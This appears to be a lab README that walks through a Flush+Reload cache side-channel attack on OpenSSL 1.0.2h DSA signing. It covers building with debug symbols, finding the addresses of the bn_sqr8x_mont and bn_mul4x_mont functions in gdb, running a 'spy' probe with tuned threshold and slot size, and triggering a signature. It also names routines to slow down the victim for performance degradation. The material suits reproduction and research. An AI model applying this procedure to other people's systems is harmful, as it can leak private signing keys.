### Workflow
Download OpenSSL 1.0.2h source code from https://www.openssl.org/source/old/1.0.2/ \
Go to the installation directory and run ./config. Do not run make depend at this point\
Open Makefile and add -g to the end of the line containg CFLAG=.....\
```
make depend
make
sudo make install
```
Copy the given flushreload.c and plot.py in the flush-reload-attacks/flush-reload/myversion and redirect to this folder\
Run ```make``` in the above folder\
Run ```gdb```, then run command file /usr/local/ssl/bin/openssl to load debugging symbols\
Run ```break bn_sqr8x_mont``` inside gdb and note the virtual address printed(V1)\
Run ```break bn_mul4x_mont``` inside gdb and note the virtual address printed(V2)\
```
./spy -e /usr/local/ssl/bin/openssl -p S:V1 -p M:V2 -s 256 -t 80 | python3 plot.py
```
In another terminal, run the folowwing:
```
/usr/local/ssl/bin/openssl dgst -dss1 -sign ~/dsa.pem -out ~/lsb-release.sig /etc/lsb-release
```

For performance degradation:\
Breaking on Lsqr4x_shift_n_add, L8x_reduce, L1st4x, Louter4x, Lsqr4x_inner, Linner4x


### Ideal parameters
Threshold : 80\
Slot size : 2048